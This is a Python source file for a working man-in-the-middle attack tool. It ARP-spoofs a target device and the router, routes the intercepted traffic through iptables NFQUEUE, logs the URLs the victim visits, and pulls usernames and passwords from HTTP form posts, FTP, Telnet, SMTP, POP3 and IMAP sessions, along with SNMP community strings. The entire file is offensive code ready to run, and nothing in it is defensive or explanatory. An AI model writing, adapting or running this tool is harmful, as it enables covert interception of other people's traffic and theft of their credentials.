#!/usr/bin/env python3

import os
import sys
import re
import argparse
import threading
from urllib.parse import unquote, parse_qs
from urllib.parse import unquote_plus
import scapy.all as scapy
from netfilterqueue import NetfilterQueue

# Define user/login related fields
user_fields = [
    "phone", "user_pass", "uname", "user_login", "user_name", "email",
    "pseudonym", "userid", "login", "user", "username"
]

pass_fields = [
    "pass",        # <-- add this common password field name
    "passwd", "passwrd", "login_password", "pwd", "passphrase",
    "password", "user_password", "pswd", "userpwd", "upass", "pwd1",
    "secure_pass", "auth_pass", "mypassword", "account_password"
]

def enable_ip_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not get MAC address for {target_ip}")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if not target_mac or not source_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)

def mitm(target_ip, router_ip, stop_event):
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop")
    try:
        while not stop_event.is_set():
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            stop_event.wait(2)
    except KeyboardInterrupt:
        pass
    print("[*] Restoring ARP tables...")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.TCP) and (scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].sport == 80):
        try:
            payload = bytes(scapy_packet[scapy.Raw].load).decode("utf-8", errors="ignore")
        except:
            packet.accept()
            return

        host = None
        host_match = re.search(r"Host: ([^\r\n]+)", payload)
        if host_match:
            host = host_match.group(1).strip()

        # Print visited HTTP GET URLs
        get_match = re.search(r"GET (.*?) HTTP/1\.[01]", payload)
        if get_match and host:
            url = f"http://{host}{get_match.group(1)}"
            print(f"Visited link: {url}")

        # Process POST requests for credentials
        if "POST" in payload and host:
            parts = payload.split("\r\n\r\n", 1)
            if len(parts) == 2:
                body = parts[1]  # POST data (still URL encoded)

                # Parse URL-encoded form data robustly
                parsed_body = parse_qs(body)

                creds = {}
                for key, values in parsed_body.items():
                    key_lower = key.lower()
                    if key_lower in user_fields + pass_fields:
                        creds[key_lower] = values[0]  # take first value

                if creds:
                    print(f"URL: http://{host}")

                    # Extract login/user field - first found from user_fields in creds
                    login = None
                    for ufield in user_fields:
                        if ufield in creds:
                            login = creds[ufield]
                            break
                    if not login:
                        login = "N/A"

                    # Extract password field - first found from pass_fields in creds
                    pwd = None
                    for pfield in pass_fields:
                        if pfield in creds:
                            pwd = creds[pfield]
                            break
                    if not pwd:
                        pwd = "N/A"

                    print(f"LOGIN: {login}")
                    print(f"PWD: {pwd}")
                    print(f"CONTENT: {unquote_plus(body)}")

    # ----------- Additional Plaintext Protocol Sniffing -----------
    # Get IP layer and TCP/UDP layer
    ip_layer = scapy_packet.getlayer(scapy.IP)
    if scapy_packet.haslayer(scapy.TCP) or scapy_packet.haslayer(scapy.UDP):
        sport = scapy_packet.sport
        dport = scapy_packet.dport
        proto = None
        # FTP (port 21)
        if 21 in (sport, dport):
            proto = "FTP"
        # Telnet (port 23)
        elif 23 in (sport, dport):
            proto = "TELNET"
        # SMTP (25, 587, 465)
        elif any(port in (sport, dport) for port in [25, 587, 465]):
            proto = "SMTP"
        # POP3 (110)
        elif 110 in (sport, dport):
            proto = "POP3"
        # IMAP (143)
        elif 143 in (sport, dport):
            proto = "IMAP"
        # SMB (445)
        elif 445 in (sport, dport):
            proto = "SMB"
        # SNMP (161, 162)
        elif any(port in (sport, dport) for port in [161, 162]):
            proto = "SNMP"

        # Only process if protocol detected and Raw layer exists
        if proto and scapy_packet.haslayer(scapy.Raw):
            try:
                rawdata = bytes(scapy_packet[scapy.Raw].load)
                payload_str = rawdata.decode("utf-8", errors="ignore")
            except Exception:
                payload_str = ""

            # Host/peer IP
            host_ip = ip_layer.dst if sport in (21,23,25,587,465,110,143,445,161,162) else ip_layer.src

            # FTP
            if proto == "FTP":
                # USER username
                user_match = re.search(r"\bUSER ([^\r\n]+)", payload_str)
                pass_match = re.search(r"\bPASS ([^\r\n]+)", payload_str)
                if user_match:
                    ftp_user = user_match.group(1)
                    print(f"FTP: {host_ip} LOGIN: {ftp_user}")
                if pass_match:
                    ftp_pass = pass_match.group(1)
                    print(f"FTP: {host_ip} PWD: {ftp_pass}")

            # Telnet
            elif proto == "TELNET":
                # Try to catch login/password prompts (heuristic)
                login_match = re.search(r"login[: ]*([^\r\n]*)", payload_str, re.IGNORECASE)
                pass_match = re.search(r"password[: ]*([^\r\n]*)", payload_str, re.IGNORECASE)
                if login_match and login_match.group(1).strip():
                    print(f"TELNET: {host_ip} LOGIN: {login_match.group(1).strip()}")
                if pass_match and pass_match.group(1).strip():
                    print(f"TELNET: {host_ip} PWD: {pass_match.group(1).strip()}")

            # SMTP
            elif proto == "SMTP":
                # AUTH LOGIN base64(user) base64(pass)
                auth_match = re.search(r"AUTH LOGIN\s+([A-Za-z0-9+/=]+)", payload_str)
                if auth_match:
                    import base64
                    try:
                        user = base64.b64decode(auth_match.group(1)).decode()
                        print(f"SMTP: {host_ip} LOGIN: {user}")
                    except Exception:
                        pass
                # Look for plain text login/password
                login_match = re.search(r"user=([^\s&]+)", payload_str, re.IGNORECASE)
                pass_match = re.search(r"pass=([^\s&]+)", payload_str, re.IGNORECASE)
                if login_match:
                    print(f"SMTP: {host_ip} LOGIN: {login_match.group(1)}")
                if pass_match:
                    print(f"SMTP: {host_ip} PWD: {pass_match.group(1)}")

            # POP3
            elif proto == "POP3":
                user_match = re.search(r"\bUSER ([^\r\n]+)", payload_str)
                pass_match = re.search(r"\bPASS ([^\r\n]+)", payload_str)
                if user_match:
                    print(f"POP3: {host_ip} LOGIN: {user_match.group(1)}")
                if pass_match:
                    print(f"POP3: {host_ip} PWD: {pass_match.group(1)}")

            # IMAP
            elif proto == "IMAP":
                login_match = re.search(r'LOGIN\s+"?([^" ]+)"?\s+"?([^" ]+)"?', payload_str, re.IGNORECASE)
                if login_match:
                    print(f"IMAP: {host_ip} LOGIN: {login_match.group(1)} PWD: {login_match.group(2)}")

            # SMB - only plaintext, very limited (real SMB parsing needs a lib)
            elif proto == "SMB":
                # Try to catch NTLM/Negotiate (heuristic)
                if "NTLMSSP" in payload_str:
                    print(f"SMB: {host_ip} NTLMSSP authentication detected (credentials not extractable here)")
                # Basic, not reliable for all cases

            # SNMP (community string is like a password)
            elif proto == "SNMP":
                comm_match = re.search(r"\x04([^\x00-\x1F]{4,32})", rawdata.decode("latin1", errors="ignore"))
                if comm_match:
                    print(f"SNMP: {host_ip} COMMUNITY: {comm_match.group(1)}")

    packet.accept()

def main():
    parser = argparse.ArgumentParser(description="MITM HTTP and credentials sniffer")
    parser.add_argument("-t", "--target", required=True, help="Target IP address (phone)")
    parser.add_argument("-r", "--router", required=True, help="Router IP address")
    parser.add_argument("iface", help="Network interface to use (e.g. wlan0)")
    args = parser.parse_args()

    enable_ip_forward()

    stop_event = threading.Event()
    thread = threading.Thread(target=mitm, args=(args.target, args.router, stop_event))
    thread.start()

    print("[*] Setting iptables rules for packet capture")
    os.system(f"iptables -I FORWARD -i {args.iface} -s {args.target} -j NFQUEUE --queue-num 1")
    os.system(f"iptables -I FORWARD -o {args.iface} -d {args.target} -j NFQUEUE --queue-num 1")

    nfqueue = NetfilterQueue()
    try:
        nfqueue.bind(1, process_packet)
        print("[*] Starting packet capture. Press Ctrl+C to stop.")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfqueue.unbind()
        print("[*] Restoring iptables...")
        os.system(f"iptables -D FORWARD -i {args.iface} -s {args.target} -j NFQUEUE --queue-num 1")
        os.system(f"iptables -D FORWARD -o {args.iface} -d {args.target} -j NFQUEUE --queue-num 1")
        stop_event.set()
        thread.join()
        disable_ip_forward()
        print("[*] Exiting...")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run as root")
        sys.exit(1)
    main()
